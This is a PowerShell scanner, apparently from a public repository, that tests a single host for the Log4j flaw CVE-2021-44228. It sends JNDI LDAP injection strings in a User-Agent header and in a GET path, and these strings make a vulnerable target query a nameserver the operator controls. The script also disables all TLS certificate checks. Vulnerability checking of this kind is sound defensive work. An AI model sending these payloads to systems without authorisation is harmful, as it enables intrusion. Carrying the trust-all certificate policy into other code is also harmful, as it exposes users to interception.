# CVE-2021-44228 - Log4j Powershell Checker
#
# Perform a scan of a single host to see if it's
# vulnerable for the above-mentioned CVE.
#
# https://github.com/crypt0jan/log4j-powershell-checker
#
# License: MIT license.
# ______________________________________________

# Suppress warnings
$ErrorActionPreference = "silentlyContinue"

# Change this to your NameServer
# See: https://github.com/NorthwaveSecurity/log4jcheck/blob/main/README.md#setting-up-a-dns-server
$NameServer = "log4jdnsreq.example.com"

# Enable Proxy
$Proxy = $false

if ($Proxy) {
    $ProxyServer = "http://proxyserver:8080"
    $ProxyCredentials = Get-Credential
    [system.net.webrequest]::DefaultWebProxy = New-Object System.Net.webproxy($ProxyServer);
    [system.net.webrequest]::DefaultWebProxy.Credentials = New-Object System.Net.NetworkCredential($ProxyCredentials.Username, $ProxyCredentials.Password);
}

# Check input args
$target = $null
if (!$args[0]) { 
    Write-Host "I need a target.."
    Write-Host "Example: .\log4j_ps_checker.ps1 http://12.34.56.78"
    Exit
} else {
    $target = $args[0]
    Write-Host ("Scanning target: {0}" -f $target)
}

# Override SSL verify to prevent vulnerability checks bouncing on invalid certificates. 
add-type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {
            return true;
        }
 }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

# Check 1 (User Agent)
# Inspired by: https://gist.github.com/byt3bl33d3r/46661bc206d323e6770907d259e009b6

Write-Host "-- CHECK 1 --" -ForegroundColor red -BackgroundColor white
Write-Host "Sending request to $target using User-Agent injection..." -ForegroundColor red -BackgroundColor white

$uar = $null
$JsonHeader = @{ 'User-Agent' = '${jndi:ldap://check1.' + $($NameServer) + '/test.class}' }
try {
    $uar = Invoke-WebRequest $target -Headers $JsonHeader
}catch {
    $uar = $_.Exception
}

#Write-Host $uar

# Check 2 (Get Request)

Write-Host "-- CHECK 2 --" -ForegroundColor red -BackgroundColor white
Write-Host "Sending request to $target using GET request injection..." -ForegroundColor red -BackgroundColor white

$gr = $null
$GetParam = ('${jndi:ldap://check2.' + $NameServer + '/test.class}')
try {
    $gr = Invoke-WebRequest ( $target + "/" + $GetParam )
}catch {
    $gr = $_.Exception
}

Write-Host $gr

# CLEAR PROXY
if ($Proxy) {
    [system.net.webrequest]::defaultwebproxy = New-Object System.Net.WebProxy($null)
}

# _______________________
# Now, go to your $NameServer and check file 
# '/var/log/named/query.log' for incoming requests.
# If there is a request, the $target is vulnerable!

Write-Host "Check /var/log/named/query.log on your NameServer." -ForegroundColor red -BackgroundColor white
Write-Host "Incoming connection from your target means vulnerable!" -ForegroundColor red -BackgroundColor white
